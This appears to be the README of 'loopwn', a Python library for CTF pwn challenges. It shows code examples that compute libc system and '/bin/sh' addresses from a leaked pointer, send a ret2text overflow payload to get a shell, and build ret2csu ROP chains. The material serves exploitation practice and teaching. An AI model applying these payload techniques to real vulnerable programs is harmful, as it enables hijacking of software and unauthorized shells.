# loopwn

A Python library designed to assist with CTF Pwn challenges, specifically focusing on Libc address calculation and leak exploitation.

## Installation

```bash
pip install loopwn
```

## Usage

### 1. Looplibc - Libc Address Calculation

```python
from loopwn import Looplibc

# Example 1: Initialize with a known base address
libc = Looplibc('./libc.so.6', 0x7ffff7a0d000)

# Example 2: Initialize with a leaked symbol address
# This will automatically calculate the base address
libc = Looplibc('./libc.so.6', 'puts', 0x7ffff7a8c5a0)

# Access addresses
print(hex(libc.system))
print(hex(libc.bin_sh))
```

### 2. loop2text - Auto Ret2text Exploitation

```python
from pwn import *
from loopwn import loop2text

# Start process
io = process('./pwn')

# Exploit
# Automatically sends payload and verifies shell with an echo check
# Args: padding_length, backdoor_address, io_object
loop2text(112, 0x401186, io)
```

### 3. loopcsu - Auto Ret2CSU Payload Generation

```python
from loopwn import loopcsu

# Gadget addresses (Usually found in __libc_csu_init)
# csu_end: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
# csu_start: mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
csu_end = 0x4011da
csu_start = 0x4011c0

# Generate payload
# Args: csu_end, csu_start, r12, r13, r14, r15, return_addr, padding=0
payload = loopcsu(
    csu_end, csu_start,
    r12=0x601018,       # Function pointer (e.g., GOT address)
    r13=0,              # Arg1 (EDI)
    r14=1,              # Arg2 (RSI)
    r15=2,              # Arg3 (RDX)
    return_addr=0x401120,
    padding=0x20
)

# Send payload
io.sendline(payload)
```

## Features

- **Automatic Base Calculation**: Easily calculate libc base address from a leaked symbol.
- **Quick Access**: Get `system` and `/bin/sh` addresses via properties.
- **Auto Ret2Text**: Generate payload and get shell in one line with `loop2text`.
- **Auto Ret2CSU**: Simplify Ret2CSU payload construction with `loopcsu`.
- **Shell Verification**: Automatically checks if shell is obtained.
- **Pwntools Integration**: Inherits from `pwntools`'s `ELF` class.
